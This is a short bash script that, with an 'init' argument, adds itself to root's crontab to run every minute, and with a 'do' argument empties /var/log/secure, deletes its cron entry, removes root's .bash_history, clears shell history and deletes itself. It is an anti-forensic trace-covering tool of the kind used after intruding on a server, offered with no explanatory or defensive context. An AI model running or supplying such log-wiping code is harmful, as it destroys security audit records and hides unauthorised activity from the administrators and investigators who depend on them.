#!/bin/bash

case $1 in
init)
echo "*/1 * * * * `pwd -P`/exit.sh" >> /var/spool/cron/root
;;
do)
echo -n > /var/log/secure
sed -i '/exit.sh$/d' /var/spool/cron/root
rm -rf /root/.bash_history
history -c
rm -rf $0
;;
*)
echo ?
;;
esac
